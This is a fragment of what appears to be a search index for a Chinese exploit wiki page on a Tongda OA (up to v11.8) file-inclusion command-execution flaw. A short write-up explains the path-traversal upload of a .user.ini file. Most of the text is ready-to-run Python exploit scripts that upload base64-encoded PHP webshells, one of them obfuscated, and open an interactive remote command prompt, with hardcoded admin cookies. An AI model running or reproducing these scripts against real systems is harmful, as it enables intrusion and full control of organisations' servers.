http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mCookie >>> xxxxxxxxxxxxxxxxxxxxxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , Cookie ): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" , \"Accept-Language\" : \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"Content-Type\" : \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\" , \"Connection\" : \"close\" , \"Cookie\" : Cookie , \"Upgrade-Insecure-Requests\" : \"1\" , } data = base64 . b64decode ( \"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==\" ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033 [0m\" . format ( target_url )) if \"\u6863\u6848\u5df2\u4fdd\u5b58\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6210\u529f\u4e0a\u4f20.user.ini\u6587\u4ef6, \\033 [0m\" . format ( target_url )) POC_2 ( target_url , Cookie ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0a\u4f20.user.ini\u6587\u4ef6\u5931\u8d25 \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , Cookie ): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/peiqi\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" , \"Accept-Language\" : \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"Content-Type\" : \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\" , \"Connection\" : \"close\" , \"Cookie\" : Cookie , \"Upgrade-Insecure-Requests\" : \"1\" , } data = base64 . b64decode ( \"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCjw/cGhwIAplY2hvICJQZWlRaV9XaWtpIjsKJGZPZ1Q9Y3JlYXRlX2Z1bmN0aW9uKGJhc2U2NF9kZWNvZGUoJ0pBPT0nKS5jaHIoMTE0MTk1Lzk5Mykuc3RyX3JvdDEzKCdiJykuc3RyX3JvdDEzKCd6JykuY2hyKDcwOC02MDcpLGNocigweGM2MGUvMHgxZjYpLmJhc2U2NF9kZWNvZGUoJ2RnPT0nKS5zdHJfcm90MTMoJ24nKS5jaHIoMzkwLTI4MikuY2hyKDB4MWFlLTB4MTg2KS5jaHIoMHgzYWMtMHgzODgpLmNocigweGQ1NjEvMHgxZGIpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5iYXNlNjRfZGVjb2RlKCdiUT09JykuYmFzZTY0X2RlY29kZSgnWlE9PScpLnN0cl9yb3QxMygnKScpLmNocig3OTgtNzM5KSk7JGZPZ1QoYmFzZTY0X2RlY29kZSgnT1RNMk4nLidETTNPMCcuJ0JsZGtGJy4nc0tDUmYnLicnLnN0cl9yb3QxMygnSCcpLnN0cl9yb3QxMygnUicpLmNocig0MTM4Mi83MjYpLnN0cl9yb3QxMygnRycpLmJhc2U2NF9kZWNvZGUoJ1ZnPT0nKS4nJy4nJy5iYXNlNjRfZGVjb2RlKCdSZz09Jykuc3RyX3JvdDEzKCdnJykuc3RyX3JvdDEzKCdEJykuYmFzZTY0X2RlY29kZSgnV2c9PScpLmNocigyMzc1MS8yNzMpLicnLidsUmFWMCcuJ3BPekk0Jy4nTURrek0nLidURTcnLicnKSk7Pz4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0K\" ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \\033 [0m\" . format ( target_url )) if \"\u6863\u6848\u5df2\u4fdd\u5b58\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6210\u529f\u4e0a\u4f20 peiqi.log \u6587\u4ef6, \\033 [0m\" . format ( target_url )) POC_3 ( target_url , Cookie ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0a\u4f20 peiqi.log \u6587\u4ef6\u5931\u8d25 \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_3 ( target_url , Cookie ): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : Cookie , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/reportshop/workshop/report/attachment-remark/form.inc.php? \\033 [0m\" . format ( target_url )) if \"PeiQi_Wiki\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e\uff0c\u54cd\u5e94\u4e2d\u5305\u542b PeiQi_Wiki \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u6210\u529f\u4e0a\u4f20\u8681\u5251\u6728\u9a6c \u5bc6\u7801\u4e3a: PeiQi \\n [o] webshell\u8def\u5f84: {} /general/reportshop/workshop/report/attachment-remark/form.inc.php? \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e\uff0c\u54cd\u5e94\u4e2d\u4e0d\u5305\u542b PeiQi_Wiki \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) Cookie = \"PHPSESSID=ug4ip8ohugo61bmu399npplep5; USER_NAME_COOKIE=admin; OA_USER_ID=admin\" POC_1 ( target_url , Cookie )","title":"\u901a\u8fbeOA v11.8 \u540e\u53f0\u6587\u4ef6\u5305\u542b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u901a\u8fbeoa-v118-\u540e\u53f0\u6587\u4ef6\u5305\u542b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e","text":"","title":"\u901a\u8fbeOA v11.8 \u540e\u53f0\u6587\u4ef6\u5305\u542b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u901a\u8fbeOA v11.8\u4ee5\u4e0b\u5b58\u5728\u6587\u4ef6\u4e0a\u4f20\u63a5\u53e3\uff0c\u53ef\u4e0a\u4f20 .user.ini \u6587\u4ef6\u5305\u542b\u6709PHP\u8bed\u53e5\u7684\u6587\u4ef6\u5bfc\u81f4\u547d\u4ee4\u6267\u884c","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u901a\u8fbeOA < v11.8","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u73af\u5883\u642d\u5efa","text":"\u901a\u8fbeOA v11.6\u4e0b\u8f7d\u94fe\u63a5 \u4e0b\u8f7d\u5b8c\u6bd5\u70b9\u51fb\u5b89\u88c5\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8fd9\u91cc\u4f7f\u7528\u7684\u73af\u5883\u4e3a\u901a\u8fbe v11.6\u7248\u672c \u51fa\u73b0\u6f0f\u6d1e\u7684\u6587\u4ef6\u4e3a webroot/general/hr/manage/staff_info/update.php <?php include_once \"inc/auth.inc.php\" ; include_once \"inc/utility_all.php\" ; include_once \"inc/utility_file.php\" ; include_once \"inc/utility_field.php\" ; include_once \"inc/utility_cache.php\" ; include_once \"general/system/log/annual_leave_log.php\" ; if ( strstr ( $BYNAME , \"/\" ) || strstr ( $BYNAME , \" \\\\ \" ) || strstr ( $BYNAME , \"..\" )) { Message ( _ ( \"\u9519\u8bef\" ), _ ( \"OA\u7528\u6237\u540d\u5305\u542b\u975e\u6cd5\u5b57\u7b26\uff01\" )); exit (); } include_once \"inc/header.inc.php\" ; echo \" \\r\\n <body class= \\\" bodycolor \\\" > \\r\\n \" ; echo \" \\r\\n <body class= \\\" bodycolor \\\" > \\r\\n \" ; $PHOTO_NAME0 = $_FILES [ \"ATTACHMENT\" ][ \"name\" ]; $ATTACHMENT = $_FILES [ \"ATTACHMENT\" ][ \"tmp_name\" ]; if ( $PHOTO_NAME0 != \"\" ) { $FULL_PATH = MYOA_ATTACH_PATH . \"hrms_pic\" ; if ( ! file_exists ( $FULL_PATH )) { @ mkdir ( $FULL_PATH , 448 ); } $PHOTO_NAME = $USER_ID . substr ( $PHOTO_NAME0 , strrpos ( $PHOTO_NAME0 , \".\" )); $FILENAME = MYOA_ATTACH_PATH . \"hrms_pic/\" . $PHOTO_NAME ; td_copy ( $ATTACHMENT , $FILENAME ); if ( file_exists ( $ATTACHMENT )) { unlink ( $ATTACHMENT ); } if ( ! file_exists ( $FILENAME )) { Message ( _ ( \"\u9644\u4ef6\u4e0a\u4f20\u5931\u8d25\" ), _ ( \"\u539f\u56e0\uff1a\u9644\u4ef6\u6587\u4ef6\u4e3a\u7a7a\u6216\u6587\u4ef6\u540d\u592a\u957f\uff0c\u6216\u9644\u4ef6\u5927\u4e8e30\u5146\u5b57\u8282\uff0c\u6216\u6587\u4ef6\u8def\u5f84\u4e0d\u5b58\u5728\uff01\" )); Button_Back (); exit (); } } \u5728\u8fd9\u91cc\u53c2\u6570 $USER_ID \u662f\u53ef\u63a7\u7684\uff0c\u5e76\u4e14\u65e0\u8fc7\u6ee4\u5371\u9669\u7b26\u53f7\u5c31\u62fc\u63a5\u8fdb\u53bb\u4e86\uff0c\u90a3\u6211\u4eec\u4f20\u5165 ../../../ \u6211\u4eec\u5c31\u53ef\u4ee5\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u4e86 \u7531\u4e8e\u901a\u8fbeOA \u7684\u6587\u4ef6\u4e0a\u4f20\u9650\u5236\u7684\u6b7b\u6b7b\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5229\u7528 PHP\u7684 .user.ini \u6587\u4ef6\u6765\u5305\u542b\u5176\u4ed6\u6587\u4ef6\uff0c\u8fd9\u91cc\u662f\u53ef\u4ee5\u7528\u4e8e\u5305\u542bPHP\u8bed\u53e5\u7684\u6587\u4ef6\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u4e0a\u4f20\u6587\u4ef6\u5185\u5bb9\u4e3a auto_prepend_file=peiqi.log \u8bf7\u6c42\u5305\u4e3a POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user HTTP/1.1 Host: 192.168.1.105 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104 Content-Length: 365 Connection: close Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31 Upgrade-Insecure-Requests: 1 -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"submit\" \u63d0\u4ea4 -----------------------------17518323986548992951984057104-- \u5176\u4e2d USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \u4e3a\u4e0a\u4f20\u8def\u5f84 \u5173\u4e8e\u66f4\u591a\u539f\u7406\u53c2\u8003 http://wiki.peiqi.tech \u4e2d\u7684\u53e6\u4e00\u7bc7 \u901a\u8fbeOA v11.8 \u540e\u53f0\u6587\u4ef6\u5305\u542b\u5b58\u50a8\u578bXSS\u6f0f\u6d1e \u8fd9\u91cc\u6211\u4eec\u7b80\u5355\u77e5\u9053\u4e86\u4e0a\u4f20\u65b9\u5f0f\uff0c\u90a3\u6211\u4eec\u5c31\u901a\u8fc7 .user.ini\u6587\u4ef6 \u5305\u542b\u6076\u610f\u6587\u4ef6 \u73b0\u5728\u5df2\u7ecf\u6210\u529f\u4e0a\u4f20\u4e86\u6076\u610f\u6587\u4ef6 \u8bbf\u95ee http://xxx.xxx.xxx.xxx/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=ipconfig \u6587\u4ef6\u5305\u542b\u547d\u4ee4\u6267\u884c [!NOTE] \u5728 v11.6\u4e2d \u4e0a\u4f20\u7684\u4f4d\u7f6e\u5e76\u6ca1\u6709\u9650\u5b9a\u6240\u4ee5\u53ef\u4ee5\u4e0a\u4f20\u5728\u65b9\u4fbf\u8bbf\u95ee\u7684\u76ee\u5f55(\u4e0d\u9700\u8981\u767b\u5f55) \u800c v11.8\u4e2d\u5219\u6709\u76ee\u5f55\u540d\u7684\u9650\u5236\u9700\u8981\u76ee\u5f55\u5e26\u6709 webroot \u548c attachment","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5229\u7528poc","text":"[!NOTE] \u811a\u672c\u5728 v11.6 \u6d4b\u8bd5\u6210\u529f\u6267\u884c\uff0c \u5728 v11.6\u4ee5\u4e0a\u6267\u884c\u65f6 \u8fd9\u4e2awebshell\u65e0\u6cd5\u6267\u884c\u547d\u4ee4 v11.7 v11.8\u53ef\u7528\u8681\u5251\u63d2\u4ef6\u7ed5\u8fc7\u8fde\u63a5webshell import requests import sys import random import re import base64 from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mVersion: \u901a\u8fbeOA < V11.8 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mCookie >>> xxxxxxxxxxxxxxxxxxxxxx \\033 [0m' ) print ( '+ \\033 [36mCmd >>> whoami \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , Cookie ): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" , \"Accept-Language\" : \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"Content-Type\" : \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\" , \"Connection\" : \"close\" , \"Cookie\" : Cookie , \"Upgrade-Insecure-Requests\" : \"1\" , } data = base64 . b64decode ( \"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==\" ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033 [0m\" . format ( target_url )) if \"\u6863\u6848\u5df2\u4fdd\u5b58\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6210\u529f\u4e0a\u4f20.user.ini\u6587\u4ef6, \\033 [0m\" . format ( target_url )) POC_2 ( target_url , Cookie ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0a\u4f20.user.ini\u6587\u4ef6\u5931\u8d25 \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , Cookie ): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/peiqi\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" , \"Accept-Language\" : \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"Content-Type\" : \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\" , \"Connection\" : \"close\" , \"Cookie\" : Cookie , \"Upgrade-Insecure-Requests\" : \"1\" , } data = base64 . b64decode ( \"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCjw/cGhwCmVjaG8gIlBlaVFpX1dpa2kiOwokY29tbWFuZD0kX0dFVFsncGVpcWknXTsKJHdzaCA9IG5ldyBDT00oJ1dTY3JpcHQuc2hlbGwnKTsKJGV4ZWMgPSAkd3NoLT5leGVjKCJjbWQgL2MgIi4kY29tbWFuZCk7CiRzdGRvdXQgPSAkZXhlYy0+U3RkT3V0KCk7CiRzdHJvdXRwdXQgPSAkc3Rkb3V0LT5SZWFkQWxsKCk7CmVjaG8gJHN0cm91dHB1dDsKPz4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=\" ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \\033 [0m\" . format ( target_url )) if \"\u6863\u6848\u5df2\u4fdd\u5b58\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6210\u529f\u4e0a\u4f20 peiqi.log \u6587\u4ef6, \\033 [0m\" . format ( target_url )) POC_3 ( target_url , Cookie ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0a\u4f20 peiqi.log \u6587\u4ef6\u5931\u8d25 \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_3 ( target_url , Cookie ): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=dir\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : Cookie , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=peiqi \\033 [0m\" . format ( target_url )) if \"PeiQi_Wiki\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e\uff0c\u54cd\u5e94\u4e2d\u5305\u542b PeiQi_Wiki,\u5b58\u5728\u6f0f\u6d1e,\u6267\u884cdir \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: {} \\033 [0m\" . format ( response . text )) while True : cmd = str ( input ( \" \\033 [36mCmd >>> \\033 [0m\" )) POC_4 ( target_url , Cookie , cmd ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e\uff0c\u54cd\u5e94\u4e2d\u4e0d\u5305\u542b PeiQi_Wiki \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_4 ( target_url , Cookie , cmd ): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi= {} \" . format ( cmd ) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : Cookie , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: {} \\033 [0m\" . format ( response . text )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) Cookie = \"USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31\" POC_1 ( target_url , Cookie ) [!NOTE] v11.8\u53ca\u4ee5\u4e0b\u53ef\u8fde\u63a5\u8681\u5251\u751f\u6210\u7684webshell\u63a7\u5236,\u4e14\u751f\u6210\u540e\u4e0d\u9700\u8981\u7ba1\u7406\u5458Cookie\u5373\u53ef\u8fde\u63a5 import requests import sys import random import re import base64 from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u901a\u8fbeOA < V11.8 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 